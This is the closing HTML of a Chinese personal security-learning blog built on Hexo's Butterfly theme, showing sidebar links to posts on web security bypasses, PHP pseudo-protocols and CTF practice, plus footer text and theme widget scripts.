src="/img/reHe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lynn's Tasks"/></a><div class="content"><a class="title" href="/2023/12/14/wangluogfBig/" title="Lynn's Tasks">Lynn's Tasks</a><time datetime="2023-12-14T03:43:49.000Z" title="发表于 2023-12-14 11:43:49">2023-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/13/RaoGuoZJ/" title="Web安全（目前）绕过|姿势总结"><img src="/img/reHe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web安全（目前）绕过|姿势总结"/></a><div class="content"><a class="title" href="/2023/12/13/RaoGuoZJ/" title="Web安全（目前）绕过|姿势总结">Web安全（目前）绕过|姿势总结</a><time datetime="2023-12-13T12:47:55.000Z" title="发表于 2023-12-13 20:47:55">2023-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/13/phpWeiXieYi/" title="php伪协议"><img src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2023/12/13/phpWeiXieYi/" title="php伪协议">php伪协议</a><time datetime="2023-12-13T03:24:58.000Z" title="发表于 2023-12-13 11:24:58">2023-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/05/neiwangSecury/" title="内网安全"><img src="/img/reHe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全"/></a><div class="content"><a class="title" href="/2023/12/05/neiwangSecury/" title="内网安全">内网安全</a><time datetime="2023-12-05T13:51:20.000Z" title="发表于 2023-12-05 21:51:20">2023-12-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/02/ctfshow/" title="ctfshow|Recording"><img src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow|Recording"/></a><div class="content"><a class="title" href="/2023/12/02/ctfshow/" title="ctfshow|Recording">ctfshow|Recording</a><time datetime="2023-12-02T14:41:06.000Z" title="发表于 2023-12-02 22:41:06">2023-12-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: ture"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>成功的花，人们只惊羡她现时的明艳，然而当初她的芽儿，浸透了奋斗的泪泉，洒遍了牺牲的血雨。成功不是一时的,而是以日夜的奋斗拼搏出来的。锲而舍之，朽木不折；锲而不舍，金石可镂。朋友们，一起去探索那浩瀚的星辰吧✨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://stellarium.org/">点击开启星辰之旅</a></div></div></div></div></div><div class="ft-item-2"><p class="ft-t">猜你想看💡<ul class="ft-links"><li><a href="/personal/about/">关于作者</a></li><li><a href="/archives/">文章归档</a></li><li><a href="/categories/">文章分类</a></li><li><a href="/tags/">文章标签</a></li></ul></p></div></div><div class="copyright"><span><b>&copy;2023</b></span><span><b>&nbsp;&nbsp;By DralinF</b></span></div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div><div id="workboard"></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script src="/js/jquery.js"></script><script src="/js/sakura.js"></script><script src="/js/foot.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script defer src="/js/runtime.js"></script><script async src="/js/title.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '113.34532,23.15624';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>